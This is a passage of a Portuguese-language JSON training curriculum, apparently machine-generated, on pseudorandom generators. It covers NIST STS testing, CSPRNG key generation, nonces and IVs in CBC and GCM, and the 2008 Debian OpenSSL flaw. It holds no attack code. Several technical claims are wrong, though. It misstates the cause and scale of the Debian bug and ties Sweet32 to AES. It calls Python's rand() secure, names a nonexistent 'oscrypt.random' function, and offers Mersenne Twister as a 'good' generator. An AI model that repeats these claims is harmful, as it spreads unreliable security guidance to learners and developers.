                            "description": "Utilizar testes estatísticos (ex: NIST STS) para verificar uniformidade, independência e período de sequências pseudoaleatórias.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de Qualidade em Sequências Pseudoaleatórias",
                                  "subSteps": [
                                    "Estude definições de uniformidade (distribuição igual de bits), independência (ausência de correlações) e período (comprimento antes de repetição).",
                                    "Revise propriedades ideais de geradores pseudoaleatórios (PRNGs) usando referências como NIST SP 800-22.",
                                    "Identifique testes estatísticos chave: Frequency, Runs, Serial, etc.",
                                    "Compare PRNGs ruins vs. bons com exemplos simples.",
                                    "Anote limitações dos testes NIST STS (não detectam todos os defeitos)."
                                  ],
                                  "verification": "Resuma em um documento os três conceitos principais com exemplos, e liste 5 testes NIST STS com propósitos.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "NIST SP 800-22 PDF",
                                    "Notebook para anotações",
                                    "Vídeos introdutórios sobre PRNGs no YouTube"
                                  ],
                                  "tips": "Use analogias como moedas justas para uniformidade para fixar conceitos.",
                                  "learningObjective": "Explicar uniformidade, independência e período de PRNGs e listar testes NIST STS.",
                                  "commonMistakes": [
                                    "Confundir período com uniformidade",
                                    "Ignorar que testes NIST não garantem criptossegurança total"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instalar e Configurar a Suíte de Testes NIST STS",
                                  "subSteps": [
                                    "Baixe o pacote NIST STS do site oficial (nist.gov).",
                                    "Compile e instale no ambiente (Linux/Windows com Cygwin ou WSL).",
                                    "Configure parâmetros: comprimento da sequência (mín. 100 bits por teste), número de sequências.",
                                    "Teste instalação executando 'assess 100000' em uma sequência de exemplo.",
                                    "Explore arquivos de configuração e scripts de automação."
                                  ],
                                  "verification": "Execute um teste de amostra e confirme saída com p-valores válidos sem erros de compilação.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "NIST STS v1.0 ou superior",
                                    "Ambiente Linux/WSL",
                                    "Compilador GCC"
                                  ],
                                  "tips": "Use Docker para instalação isolada se possível, evitando conflitos.",
                                  "learningObjective": "Instalar e rodar NIST STS corretamente com configurações padrão.",
                                  "commonMistakes": [
                                    "Baixar versão errada",
                                    "Não converter sequências para formato binário ASCII"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Gerar Sequências Pseudoaleatórias para Teste",
                                  "subSteps": [
                                    "Implemente um PRNG simples em Python/C (ex: Linear Congruential Generator - LCG).",
                                    "Gere sequências de pelo menos 1 milhão de bits em arquivo binário.",
                                    "Crie sequências 'boas' (usando Python random ou Mersenne Twister) e 'ruins' (LCG fraco).",
                                    "Valide formato: arquivo .bin com 0/1 sem quebras de linha.",
                                    "Documente parâmetros do PRNG usado (semente, multiplicador, etc.)."
                                  ],
                                  "verification": "Gere 2 arquivos .bin e confirme tamanho/integridade com 'wc -c' ou hex editor.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Python ou C com bibliotecas std",
                                    "Editor de texto/hex",
                                    "Exemplos de código LCG"
                                  ],
                                  "tips": "Comece com semente fixa para reprodutibilidade.",
                                  "learningObjective": "Gerar sequências PRNG em formato compatível com NIST STS.",
                                  "commonMistakes": [
                                    "Sequências curtas demais",
                                    "Formato errado (não binário puro)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Executar Testes NIST STS nas Sequências",
                                  "subSteps": [
                                    "Prepare arquivos de configuração para testes selecionados (ex: Frequency, Runs, FFT).",
                                    "Rode 'assess <número> -v' para sequências boa e ruim.",
                                    "Colete p-valores para cada teste (deve ser >0.01 para passar).",
                                    "Automatize com script bash para múltiplas execuções.",
                                    "Registre falhas específicas (ex: baixa uniformidade)."
                                  ],
                                  "verification": "Produza relatório com p-valores para 8+ testes em ambas sequências.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "NIST STS instalado",
                                    "Sequências .bin geradas",
                                    "Script bash simples"
                                  ],
                                  "tips": "Testes demoram; rode em background e monitore CPU.",
                                  "learningObjective": "Executar suíte NIST STS e coletar resultados quantitativos.",
                                  "commonMistakes": [
                                    "Ignorar p-valores extremos",
                                    "Não rodar número suficiente de sequências"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Interpretar Resultados e Avaliar Qualidade",
                                  "subSteps": [
                                    "Analise p-valores: proporção >0.01 indica passagem; identifique falhas.",
                                    "Compare sequências boa vs. ruim: correlacione com propriedades teóricas.",
                                    "Calcule estatísticas agregadas (média, proporção de passes).",
                                    "Escreva relatório com conclusões, gráficos de p-valores.",
                                    "Recomende melhorias para PRNGs falhos."
                                  ],
                                  "verification": "Relatório final com tabelas/gráficos e conclusão sobre qualidade das sequências.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Resultados NIST",
                                    "Excel/Python para gráficos (matplotlib)",
                                    "Template de relatório"
                                  ],
                                  "tips": "Use boxplots para visualizar distribuição de p-valores.",
                                  "learningObjective": "Interpretar resultados NIST STS para julgar qualidade de PRNG.",
                                  "commonMistakes": [
                                    "Considerar p-valor único suficiente",
                                    "Não contextualizar falhas teóricamente"
                                  ]
                                }
                              ],
                              "practicalExample": "Gere uma sequência usando LCG fraco (m=2^32, a=1103515245, c=12345) com semente 42, salve 1MB bits em 'lcg.bin'. Rode NIST STS: Frequency passa, mas Runs falha devido a padrões. Compare com Python's secrets module que passa todos.",
                              "finalVerifications": [
                                "Relatório identifica pelo menos 3 falhas em PRNG ruim com p-valores <0.01.",
                                "Sequência 'boa' passa >90% dos testes.",
                                "Gráficos de p-valores mostram distinção clara entre boa/ruim.",
                                "Conclusões ligam resultados a uniformidade/independência/período.",
                                "Configuração NIST STS reproduzível com script fornecido.",
                                "Tempo total de execução documentado e otimizado."
                              ],
                              "assessmentCriteria": [
                                "Precisão na instalação/execução NIST STS (sem erros).",
                                "Correta geração e formatação de sequências (compatíveis).",
                                "Análise quantitativa de p-valores com thresholds NIST.",
                                "Interpretação qualitativa alinhada a teoria PRNG.",
                                "Relatório completo com visualizações e recomendações.",
                                "Eficiência: tempo dentro do estimado, automação básica."
                              ],
                              "crossCurricularConnections": [
                                "Estatística: Testes de hipóteses e p-valores.",
                                "Programação: Implementação de algoritmos e automação de testes.",
                                "Matemática: Teoria dos números e análise modular.",
                                "Cibersegurança: Avaliação de primitivas criptográficas."
                              ],
                              "realWorldApplication": "Em desenvolvimento de software criptográfico, engenheiros usam NIST STS para validar PRNGs antes de deploy em protocolos como TLS/SSL, evitando ataques por previsibilidade em chaves ou nonces."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.1.1.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.1.3",
                        "name": "Propriedades e Aplicações Criptográficas",
                        "description": "Propriedades essenciais para uso criptográfico, como indistinguibilidade de aleatoriedade verdadeira, e aplicações práticas em chaves, nonces e IVs.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.1.3.1",
                            "name": "Descrever Propriedades Criptográficas de PRNG",
                            "description": "Listar e justificar propriedades como next-bit unpredictability, longo período e resistência a ataques de estado (backtracking), referenciando padrões como NIST SP 800-90A.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de PRNG Criptográficos",
                                  "subSteps": [
                                    "Definir PRNG (Pseudo-Random Number Generator) e diferenciá-lo de TRNG (True Random Number Generator).",
                                    "Identificar requisitos criptográficos básicos: determinismo, seed inicial e saída imprevisível.",
                                    "Revisar a importância de propriedades criptográficas em contextos de segurança.",
                                    "Ler introdução ao NIST SP 800-90A para contextualizar padrões.",
                                    "Anotar diferenças entre PRNG fracos e criptograficamente seguros."
                                  ],
                                  "verification": "Explicar verbalmente ou por escrito a diferença entre PRNG e RNG não criptográfico, citando um exemplo de falha.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "NIST SP 800-90A (seção introdutória)",
                                    "Artigos sobre RNG em criptografia",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Comece pela definição para construir base sólida; use diagramas para visualizar fluxo de PRNG.",
                                  "learningObjective": "Dominar fundamentos conceituais de PRNG e sua relevância criptográfica.",
                                  "commonMistakes": [
                                    "Confundir PRNG com fontes de aleatoriedade verdadeira",
                                    "Ignorar o papel da seed inicial"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Propriedade de Next-Bit Unpredictability",
                                  "subSteps": [
                                    "Definir next-bit unpredictability: impossibilidade de prever o próximo bit com probabilidade > 1/2.",
                                    "Estudar testes estatísticos como NIST STS para validar imprevisibilidade.",
                                    "Exemplificar com ataques de previsão em PRNG fracos (ex: linear congruential).",
                                    "Justificar por que isso previne ataques de oráculo.",
                                    "Simular conceitualmente um teste de previsão em pseudocódigo."
                                  ],
                                  "verification": "Prever (incorretamente) bits de um PRNG seguro e explicar por quê falha.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "NIST SP 800-90A (seção 3)",
                                    "Ferramenta online NIST STS",
                                    "Pseudocódigo de PRNG simples"
                                  ],
                                  "tips": "Use probabilidades para quantificar; foque em entropia.",
                                  "learningObjective": "Descrever e justificar next-bit unpredictability com exemplos.",
                                  "commonMistakes": [
                                    "Achar que imprevisibilidade é aleatoriedade perfeita",
                                    "Não diferenciar probabilidade computacional de absoluta"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Período Longo e Propriedades Estatísticas",
                                  "subSteps": [
                                    "Definir longo período: ciclo completo antes de repetição (ex: 2^security_strength).",
                                    "Listar propriedades estatísticas: uniformidade, independência, correlação baixa.",
                                    "Referenciar testes NIST para período e estatísticas (monobit, runs, etc.).",
                                    "Calcular exemplo de período para um LFSR criptográfico.",
                                    "Comparar com PRNG não cripto como Mersenne Twister."
                                  ],
                                  "verification": "Calcular e justificar período mínimo para uma aplicação de 128 bits de segurança.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "NIST SP 800-90A (Anexo A)",
                                    "Calculadora ou Python para simulações",
                                    "Tabelas de testes NIST"
                                  ],
                                  "tips": "Visualize sequências em gráficos para entender uniformidade.",
                                  "learningObjective": "Listar e quantificar propriedades de período e estatísticas.",
                                  "commonMistakes": [
                                    "Confundir período com entropia",
                                    "Ignorar testes estatísticos além do período"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Investigar Resistência a Ataques e Padrões NIST",
                                  "subSteps": [
                                    "Descrever ataques de estado: backtracking, forward security.",
                                    "Explicar resistência em construtores como CTR_DRBG, Hash_DRBG.",
                                    "Referenciar NIST SP 800-90A: requisitos de segurança e aprovação.",
                                    "Justificar propriedades contra ataques conhecidos (ex: Debian OpenSSL bug).",
                                    "Sintetizar lista completa de propriedades com justificativas."
                                  ],
                                  "verification": "Listar 3 ataques e como PRNG NIST-resistente os mitiga.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "NIST SP 800-90A completo",
                                    "Casos de estudo: Debian PRNG bug",
                                    "Resumo de construtores DRBG"
                                  ],
                                  "tips": "Mapeie propriedades a ataques específicos para memorização.",
                                  "learningObjective": "Justificar todas propriedades com referências a padrões e ataques.",
                                  "commonMistakes": [
                                    "Subestimar backtracking em PRNG sem forward secrecy",
                                    "Não citar fontes NIST específicas"
                                  ]
                                }
                              ],
                              "practicalExample": "Analise o Hash_DRBG do NIST SP 800-90A: descreva como ele garante next-bit unpredictability via função hash, longo período via reseeding, e resistência a backtracking por derivação de estado, simulando em pseudocódigo a geração de 256 bits para uma chave AES.",
                              "finalVerifications": [
                                "Listar corretamente 5 propriedades criptográficas de PRNG com definições breves.",
                                "Justificar next-bit unpredictability com probabilidade matemática.",
                                "Citar seções específicas do NIST SP 800-90A para cada propriedade.",
                                "Explicar um ataque (ex: backtracking) e mitigação por PRNG seguro.",
                                "Comparar PRNG cripto vs não cripto em tabela.",
                                "Gerar exemplo de saída PRNG e validar estatisticamente."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude na listagem de propriedades (NIST-aligned).",
                                "Qualidade das justificativas com evidências matemáticas/estáticas.",
                                "Referenciação correta a padrões como NIST SP 800-90A.",
                                "Capacidade de conectar propriedades a ataques reais.",
                                "Clareza e estrutura na descrição escrita/oral.",
                                "Uso de exemplos práticos e verificáveis."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Teoria da Probabilidade e Estatística (testes NIST STS).",
                                "Programação: Implementação de PRNG em linguagens como Python/Crypto++.",
                                "Cibersegurança: Aplicações em protocolos TLS/SSH.",
                                "Física: Entropia de fontes quânticas para seeds.",
                                "Ética: Riscos de PRNG fracos em sistemas críticos."
                              ],
                              "realWorldApplication": "Em protocolos como TLS 1.3, PRNG criptográficos geram chaves de sessão efêmeras, garantindo next-bit unpredictability para prevenir interceptação, longo período para sessões múltiplas e resistência a backtracking para proteger sessões passadas mesmo se seed vazada."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.1.3.2",
                            "name": "Aplicar PRNG na Geração de Chaves",
                            "description": "Demonstrar o uso de CSPRNG para gerar chaves simétricas seguras, explicando riscos de reutilização de sementes em protocolos como AES.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de PRNG e CSPRNG",
                                  "subSteps": [
                                    "Defina PRNG (Pseudo-Random Number Generator) e seus determinísticos.",
                                    "Explique CSPRNG (Cryptographically Secure PRNG) e sua dependência em entropia.",
                                    "Identifique propriedades criptográficas: imprevisibilidade, sem viés, resistência a ataques.",
                                    "Discuta algoritmos comuns como Fortuna, Yarrow ou /dev/urandom.",
                                    "Analise riscos de PRNG não criptográficos em contextos de segurança."
                                  ],
                                  "verification": "Escreva um resumo de 200 palavras diferenciando PRNG de CSPRNG e liste 3 riscos de uso inadequado.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação RFC 4086",
                                    "Artigos sobre entropia em criptografia",
                                    "Vídeo introdutório sobre PRNG"
                                  ],
                                  "tips": "Sempre priorize fontes de entropia de alta qualidade como hardware RNG.",
                                  "learningObjective": "Dominar conceitos teóricos para justificar uso de CSPRNG em geração de chaves.",
                                  "commonMistakes": [
                                    "Confundir PRNG com RNG verdadeiro",
                                    "Subestimar ataques de estado conhecido",
                                    "Ignorar viés em sementes fracas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Ambiente para Geração de Chaves Seguras",
                                  "subSteps": [
                                    "Instale Python e biblioteca cryptography via pip.",
                                    "Configure OpenSSL ou equivalente para testes de linha de comando.",
                                    "Teste geração básica de números aleatórios com oscrypt.random.",
                                    "Verifique disponibilidade de fontes de entropia no sistema (ex: /dev/urandom).",
                                    "Crie um script boilerplate para geração de chaves."
                                  ],
                                  "verification": "Execute um comando para gerar 32 bytes aleatórios e confirme unicidade em múltiplas execuções.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Python 3.8+",
                                    "pip install cryptography",
                                    "OpenSSL instalado"
                                  ],
                                  "tips": "Use ambientes virtuais para isolar dependências criptográficas.",
                                  "learningObjective": "Preparar ferramentas confiáveis para experimentação prática com CSPRNG.",
                                  "commonMistakes": [
                                    "Usar random padrão do Python em vez de secrets ou cryptography",
                                    "Executar em sistemas sem entropia suficiente",
                                    "Ignorar verificação de instalação"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Geração de Chaves Simétricas com CSPRNG",
                                  "subSteps": [
                                    "Gere uma chave AES-256 usando os.urandom(32) ou cryptography.fernet.",
                                    "Codifique a chave em formato hex ou base64 para inspeção.",
                                    "Encripte uma mensagem de teste com a chave gerada.",
                                    "Gere múltiplas chaves e compare sua unicidade estatística.",
                                    "Documente o processo em um script Python comentado."
                                  ],
                                  "verification": "Produza 5 chaves únicas e use elas para encriptar/decriptar mensagens sem falhas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Script Python com import os, cryptography",
                                    "Editor de código como VS Code"
                                  ],
                                  "tips": "Nunca hardcode sementes; sempre use fontes de entropia do SO.",
                                  "learningObjective": "Aplicar CSPRNG para criar chaves simétricas imprevisíveis e seguras.",
                                  "commonMistakes": [
                                    "Reutilizar sementes fixas para 'testes'",
                                    "Gerar chaves curtas insuficientes para AES",
                                    "Não validar tamanho da chave (deve ser 16/24/32 bytes)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Demonstrar Riscos de Reutilização de Sementes em AES",
                                  "subSteps": [
                                    "Gere duas chaves com a mesma semente fixa e compare.",
                                    "Encripte a mesma plaintext com ambas e observe padrões no ciphertext.",
                                    "Simule ataque known-plaintext explorando reutilização.",
                                    "Compare com chaves CSPRNG únicas e destaque diferenças.",
                                    "Explique impactos em protocolos como AES-GCM ou CBC."
                                  ],
                                  "verification": "Mostre empiricamente que sementes reutilizadas produzem chaves idênticas, comprometendo segurança.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Script Python modificado",
                                    "Ferramenta como CyberChef para análise de ciphertext"
                                  ],
                                  "tips": "Use sementes idênticas explicitamente para demonstrar o problema.",
                                  "learningObjective": "Identificar e mitigar vulnerabilidades de sementes previsíveis em criptografia.",
                                  "commonMistakes": [
                                    "Não controlar variáveis como IV/nonce",
                                    "Confundir semente com chave diretamente",
                                    "Ignorar modos de operação do AES"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um script Python, use cryptography para gerar uma chave AES-256 com CSPRNG: from cryptography.fernet import Fernet; key = Fernet.generate_key(); cipher = Fernet(key); encrypted = cipher.encrypt(b'Mensagem secreta'). Encripte uma mensagem de login e armazene a chave de forma segura, demonstrando unicidade em execuções repetidas.",
                              "finalVerifications": [
                                "Gere chaves únicas em 10 execuções consecutivas sem padrões detectáveis.",
                                "Explique verbalmente riscos de reutilização de sementes em AES.",
                                "Encripte/decripte corretamente uma mensagem usando chave CSPRNG.",
                                "Identifique pelo menos 3 consequências de PRNG fraco em protocolos reais.",
                                "Compare estatisticamente chaves geradas vs. sementes fixas."
                              ],
                              "assessmentCriteria": [
                                "Implementação correta de CSPRNG sem sementes fixas (100%).",
                                "Demonstração clara de riscos com evidências empíricas.",
                                "Explicação precisa de propriedades criptográficas.",
                                "Código limpo, comentado e reproduzível.",
                                "Análise de impacto em AES com exemplos concretos.",
                                "Uso adequado de entropia e validação de chaves."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Teoria dos Números e funções hash.",
                                "Programação: Manipulação de bibliotecas criptográficas em Python.",
                                "Redes: Integração em protocolos como TLS/SSL.",
                                "Probabilidade: Análise estatística de aleatoriedade."
                              ],
                              "realWorldApplication": "Geração de chaves de sessão efêmeras em VPNs (ex: WireGuard), certificados HTTPS ou wallets de criptomoedas, prevenindo ataques como Sweet32 em AES reutilizado."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.1.2.1"
                            ]
                          },
                          {
                            "id": "10.1.2.1.3.3",
                            "name": "Utilizar Nonces e IVs com PRNG",
                            "description": "Explicar e implementar geração de nonces únicos e IVs aleatórios para modos de cifradores como CBC e GCM, evitando ataques de repetição.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de Nonces, IVs e PRNG",
                                  "subSteps": [
                                    "Defina nonce como um valor utilizado uma única vez para garantir unicidade em operações criptográficas.",
                                    "Explique IV (Initialization Vector) como um vetor de inicialização aleatório usado em modos de bloco como CBC.",
                                    "Discuta a importância de PRNG (Pseudo-Random Number Generator) criptograficamente seguro para gerar valores imprevisíveis.",
                                    "Estude ataques de repetição causados pela reutilização de nonces/IVs, como padding oracle em CBC.",
                                    "Compare usos em modos CBC (IV obrigatório) e GCM (nonce para autenticação)."
                                  ],
                                  "verification": "Escreva um resumo de 200 palavras explicando diferenças e riscos, com exemplos de ataques.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "RFC 5116 (Nonces), RFC 4086 (PRNG), Documentação OpenSSL ou libsodium"
                                  ],
                                  "tips": "Sempre associe nonces/IVs a chaves específicas; nunca reutilize com a mesma chave.",
                                  "learningObjective": "Dominar definições e papéis de nonces, IVs e PRNG na prevenção de ataques.",
                                  "commonMistakes": [
                                    "Confundir nonce com IV sem contexto de modo",
                                    "Usar PRNG não criptográfico como rand()"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Ambiente de Desenvolvimento e PRNG Seguro",
                                  "subSteps": [
                                    "Instale bibliotecas criptográficas seguras (ex: cryptography em Python, ou libsodium).",
                                    "Implemente geração de PRNG usando funções seguras como os.urandom() ou random.SystemRandom().",
                                    "Gere nonces/IVs de tamanhos corretos: 96 bits para GCM, 128 bits para CBC.",
                                    "Teste unicidade gerando 1000 valores e verificando colisões.",
                                    "Documente entropia mínima requerida para PRNG."
                                  ],
                                  "verification": "Execute script que gera 1000 IVs e confirme zero colisões via hash set.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Python 3+, biblioteca cryptography: pip install cryptography",
                                    "Ambiente Jupyter Notebook"
                                  ],
                                  "tips": "Use fontes de entropia do sistema operacional para máxima segurança.",
                                  "learningObjective": "Configurar e validar PRNG para geração segura de nonces/IVs.",
                                  "commonMistakes": [
                                    "Usar random.random() em vez de urandom",
                                    "Gerar IVs curtos insuficientes"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Geração e Uso de IVs em Modo CBC",
                                  "subSteps": [
                                    "Crie função para gerar IV de 16 bytes com PRNG.",
                                    "Implemente cifragem AES-CBC com IV único por mensagem.",
                                    "Adicione IV ao início do ciphertext para transmissão.",
                                    "Teste descriptografia com IV correto e incorreto (deve falhar).",
                                    "Simule ataque de repetição reutilizando IV e observe falha de segurança."
                                  ],
                                  "verification": "Cifre/desencripte 5 mensagens diferentes com IVs únicos; confirme integridade.",
                                  "estimatedTime": "1 hora e 30 minutos",
                                  "materials": [
                                    "Código Python com cryptography.fernet ou AES-CBC",
                                    "Ferramenta Wireshark para inspecionar pacotes"
                                  ],
                                  "tips": "IV deve ser aleatório e público, mas nunca reutilizado com a mesma chave.",
                                  "learningObjective": "Aplicar nonces/IVs corretamente em CBC para evitar repetições.",
                                  "commonMistakes": [
                                    "Reutilizar IV fixo como zeros",
                                    "Não transmitir IV com ciphertext"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Nonces em Modo GCM e Verificações Finais",
                                  "subSteps": [
                                    "Gere nonce de 12 bytes (96 bits) para AES-GCM usando PRNG.",
                                    "Implemente cifragem/autenticação GCM com nonce único.",
                                    "Valide tag de autenticação em descriptografia.",
                                    "Teste reutilização de nonce: observe vazamento de plaintext via XOR.",
                                    "Integre verificações automáticas de unicidade em um contador ou banco."
                                  ],
                                  "verification": "Crie script que falha intencionalmente com nonce repetido e corrija.",
                                  "estimatedTime": "1 hora e 15 minutos",
                                  "materials": [
                                    "Biblioteca cryptography.hazmat.primitives.ciphers",
                                    "Exemplos GCM da NIST"
                                  ],
                                  "tips": "Para GCM, nonces de 96 bits são ideais; evite contadores sem PRNG.",
                                  "learningObjective": "Dominar uso de nonces em GCM com autenticação integrada.",
                                  "commonMistakes": [
                                    "Usar nonces longos >120 bits em GCM",
                                    "Ignorar tag de autenticação"
                                  ]
                                }
                              ],
                              "practicalExample": "Em Python: from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes; from cryptography.hazmat.backends import default_backend; import os; iv = os.urandom(16); cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend()); encryptor = cipher.encryptor(); ct = encryptor.update(plaintext) + encryptor.finalize(); envie mensagem como iv + ct.",
                              "finalVerifications": [
                                "Gerar e usar 10 nonces/IVs únicos em CBC/GCM sem colisões.",
                                "Simular e detectar ataque de repetição com reutilização.",
                                "Confirmar descriptografia falha com IV/nonce incorreto.",
                                "Medir entropia de gerados via entropia tools.",
                                "Documentar código com comentários sobre unicidade.",
                                "Testar em rede local com Wireshark."
                              ],
                              "assessmentCriteria": [
                                "Correção na geração de nonces/IVs com PRNG seguro (sem previsibilidade).",
                                "Implementação sem reutilização em múltiplas operações.",
                                "Tratamento adequado de erros em autenticação GCM.",
                                "Código limpo, comentado e modular.",
                                "Evidência de testes contra repetição.",
                                "Uso de tamanhos padrão (16B IV CBC, 12B nonce GCM)."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Probabilidade e entropia em PRNG.",
                                "Programação: Manipulação de binários e bibliotecas crypto.",
                                "Redes: Integração em protocolos TLS/DTLS.",
                                "Ética: Implicações de falhas criptográficas em privacidade."
                              ],
                              "realWorldApplication": "Em VPNs (IPsec usa nonces em ESP-GCM), HTTPS/TLS (record IVs em TLS 1.3) e apps de mensagens (Signal usa nonces para Double Ratchet), prevenindo ataques como Sweet32 em CBC ou nonce-reuse em GCM."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.1.3.1"
                            ]
                          },
                          {
                            "id": "10.1.2.1.3.4",
                            "name": "Identificar Vulnerabilidades em PRNG",
                            "description": "Analisar casos reais de falhas (ex: Debian OpenSSL 2008), identificando ataques como predição de estado e recomendações de mitigação.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de PRNG e Vulnerabilidades Comuns",
                                  "subSteps": [
                                    "Estude a definição de PRNG e diferenciação de RNG verdadeiros.",
                                    "Revise propriedades criptográficas essenciais: imprevisibilidade, uniformidade e independência.",
                                    "Identifique classes de vulnerabilidades: sementes fracas, estados previsíveis e bias.",
                                    "Analise exemplos genéricos de falhas em PRNG lineares congruenciais (LCG).",
                                    "Documente três vulnerabilidades comuns em um mapa mental."
                                  ],
                                  "verification": "Crie um resumo de 200 palavras explicando PRNG vs RNG e liste 3 vulnerabilidades com exemplos.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Documentação RFC 4086",
                                    "Artigo 'Random Numbers in Cryptography'",
                                    "Ferramenta de mind mapping como XMind"
                                  ],
                                  "tips": "Use analogias como 'chave de carro previsível' para sementes fracas para fixar conceitos.",
                                  "learningObjective": "Explicar o funcionamento de PRNG e identificar suas vulnerabilidades criptográficas básicas.",
                                  "commonMistakes": [
                                    "Confundir PRNG com RNG criptograficamente seguros.",
                                    "Ignorar o impacto de sementes reutilizáveis.",
                                    "Subestimar bias em distribuições não uniformes."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o Caso Real: Debian OpenSSL 2008",
                                  "subSteps": [
                                    "Leia o relatório oficial da falha no Debian OpenSSL (CVE-2008-0166).",
                                    "Identifique a causa raiz: remoção de fork() no código de entropia por aviso do lint.",
                                    "Trace o fluxo de geração de chaves RSA afetadas.",
                                    "Colete dados: número de chaves fracas geradas (estimado em 1 milhão).",
                                    "Registre impactos: comprometimento de chaves SSH e SSL em produção."
                                  ],
                                  "verification": "Escreva um relatório de 1 página resumindo causa, impacto e lições do caso Debian.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Relatório Debian Security Advisory DSA-1571-1",
                                    "Artigo original de Luciano Bello",
                                    "CVE database entry"
                                  ],
                                  "tips": "Siga uma linha do tempo cronológica para mapear a propagação da falha.",
                                  "learningObjective": "Descrever em detalhes o caso Debian OpenSSL 2008 e sua cadeia de eventos.",
                                  "commonMistakes": [
                                    "Focar só no bug sem contextualizar o ecossistema Debian.",
                                    "Ignorar o papel do PID na entropia.",
                                    "Não quantificar o escopo do impacto."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Ataques Específicos: Predição de Estado e Outros",
                                  "subSteps": [
                                    "Simule predição de estado em PRNG com código Python simples (ex: LCG).",
                                    "Estude ataques de predição em PRNG truncados ou com estados conhecidos.",
                                    "Analise ataques no contexto Debian: rainbow tables para chaves fracas.",
                                    "Explore variantes: ataques de canal lateral em hardware RNG.",
                                    "Teste um ataque prático em ambiente controlado com script."
                                  ],
                                  "verification": "Implemente e demonstre um script Python prevendo próximo output de um PRNG fraco.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Python com bibliotecas random e numpy",
                                    "GitHub repo com simulações de PRNG attacks",
                                    "Ferramenta Wireshark para capturas opcionais"
                                  ],
                                  "tips": "Comece com PRNG simples antes de escalar para casos reais; debugue passo a passo.",
                                  "learningObjective": "Demonstrar como prever estados de PRNG vulneráveis e executar ataques básicos.",
                                  "commonMistakes": [
                                    "Usar PRNG seguros como rand() do Python para testes.",
                                    "Não isolar variáveis no script de simulação.",
                                    "Confundir predição com brute-force."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Desenvolver Recomendações de Mitigação e Análise Geral",
                                  "subSteps": [
                                    "Liste melhores práticas: uso de /dev/urandom, sementes de alta entropia.",
                                    "Revise padrões NIST SP 800-90 para PRNG criptográficos (DRBG).",
                                    "Crie um checklist de auditoria para PRNG em código.",
                                    "Compare mitigações pré e pós-Debian (ex: OpenSSL 0.9.8i).",
                                    "Proponha políticas para desenvolvedores em ambientes de produção."
                                  ],
                                  "verification": "Elabore um guia de 500 palavras com 10 recomendações acionáveis para mitigar falhas em PRNG.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "NIST SP 800-90A",
                                    "OpenSSL changelog histórico",
                                    "Template de checklist em Markdown"
                                  ],
                                  "tips": "Priorize mitigações por custo-benefício e teste-as em cenários hipotéticos.",
                                  "learningObjective": "Formular estratégias eficazes de mitigação para vulnerabilidades em PRNG.",
